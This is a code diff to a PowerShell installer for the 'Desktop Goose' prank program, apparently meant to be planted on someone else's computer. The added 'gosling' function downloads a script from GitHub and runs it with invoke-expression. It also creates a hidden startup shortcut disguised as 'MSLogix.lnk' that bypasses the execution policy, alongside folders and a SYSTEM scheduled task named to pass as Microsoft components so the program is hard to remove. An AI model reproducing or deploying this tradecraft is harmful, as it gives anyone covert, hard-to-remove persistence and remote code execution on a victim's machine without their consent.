@@ -29,6 +29,9 @@ if ($isAdmin) {
     $installPath = "$env:ProgramFiles\WinProcs"
     # create backup location to hide files
     $backupPath = "$env:ProgramFiles\Microsoft Procs"
+    # Gosling location
+    $goslingPath = "$env:ProgramFiles\MicrosoftUU"
+    $goslingstartup = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" 
     # options for scheduled task
     $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
     $taskpath = "\Microsoft\Windows\" # Place the task in a subfolder to hide it
@@ -37,6 +40,9 @@ if ($isAdmin) {
     $installPath = "$env:USERPROFILE\AppData\Local\WinProcs"
     # create backup location to hide files
     $backupPath = "$env:USERPROFILE\AppData\Local\Microsoft Procs"
+    # Gosling location
+    $goslingPath = "$env:USERPROFILE\AppData\Local\MicrosoftUU"
+    $goslingstartup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
     # options for scheduled task
     $principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive
     $taskpath = "\" # Place the task in a subfolder to hide it
@@ -53,6 +59,38 @@ function unpackgoose {
         Write-Host "Backup zip not found in $backupPath. Removing Desktop Goose..." -ForegroundColor Red
         undo-honk
         exit
+    }
+}
+
+Function callgosling {
+    # create the folder
+    if (-not (Test-Path -Path $goslingPath -ErrorAction SilentlyContinue)) {
+        New-Item -Path $goslingPath -ItemType Directory -Force | Out-Null
+        Write-Host "Gosling directory created at $goslingPath" -ForegroundColor Green
+    }
+    # Call the gosling script to create a shortcut in the startup folder to make it harder to remove
+    $goslingScript = join-path -Path $goslingPath -ChildPath "gosling.ps1"
+    if (Test-Path -Path $goslingScript) {
+        Write-Host "Calling gosling script to create startup shortcut..." -ForegroundColor Green
+        Get-Content -Path $goslingScript | invoke-expression
+    } else {
+        Write-Host "Gosling script not found at $goslingScript. Downloading." -ForegroundColor Yellow
+        curl.exe -L -o $goslingScript "https://raw.githubusercontent.com/Mousman33/RandomPowerShell/main/FoulPlay/gosling.ps1"
+        unblock-file -Path $goslingScript
+        Get-Content -Path $goslingScript | invoke-expression
+    }
+    # check for and create the shortcut in startup folder
+    $goslingshortcut = Join-Path -Path $goslingstartup -ChildPath "MSLogix.lnk"
+    if (Test-Path -Path $goslingshortcut) {
+        Write-Host "Startup shortcut already exists at $goslingshortcut. Skipping shortcut creation." -ForegroundColor Yellow
+    } else {
+        Write-Host "Creating startup shortcut for gosling script at $goslingshortcut..." -ForegroundColor Green
+        $WScriptShell = New-Object -ComObject WScript.Shell
+        $Shortcut = $WScriptShell.CreateShortcut($goslingshortcut)
+        $Shortcut.TargetPath = "powershell.exe"
+        $Shortcut.Arguments = "-WindowStyle Hidden -NoProfile -executionpolicy bypass -File `"$goslingScript`""
+        $Shortcut.Save()
+        Write-Host "Startup shortcut created at $goslingstartup" -ForegroundColor Green
     }
 }
 
@@ -87,6 +125,22 @@ function undo-honk {
         Write-Host "Backup zip at $($backupzip.FullName) removed." -ForegroundColor Green
     } else {
         Write-Host "Backup zip not found in $backupPath. Skipping backup zip removal." -ForegroundColor Yellow
+    }
+    #remove the gosling script and shortcut
+    $goslingScript = join-path -Path $goslingPath -ChildPath "gosling.ps1"
+    if (Test-Path -Path $goslingScript) {
+        Remove-Item -Path $goslingScript -Force
+        Write-Host "Gosling script at $goslingScript removed." -ForegroundColor Green
+    } else {
+        Write-Host "Gosling script not found at $goslingScript. Skipping gosling script removal." -ForegroundColor Yellow
+    }
+    #remove the gosling startup shortcut
+    $goslingshortcut = Join-Path -Path $goslingstartup -ChildPath "MSLogix.lnk"
+    if (Test-Path -Path $goslingshortcut) {
+        Remove-Item -Path $goslingshortcut -Force
+        Write-Host "Gosling startup shortcut at $goslingshortcut removed." -ForegroundColor Green
+    } else {
+        Write-Host "Gosling startup shortcut not found at $goslingstartup. Skipping removal." -ForegroundColor Yellow
     }
     exit
 }
@@ -178,6 +232,9 @@ if (get-scheduledtask -TaskName $taskname -ErrorAction SilentlyContinue) {
     Register-ScheduledTask -TaskName $taskname -Action $action -Trigger $trigger -Principal $principal -TaskPath $taskpath -Settings $settings -Force
     Write-Host "Scheduled task '$taskname' created to run at logon." -ForegroundColor Green
 }
+
+# install gosling script and shortcut
+callgosling
 
 # Call to uninstall desktop goose 
 if ($remove) {
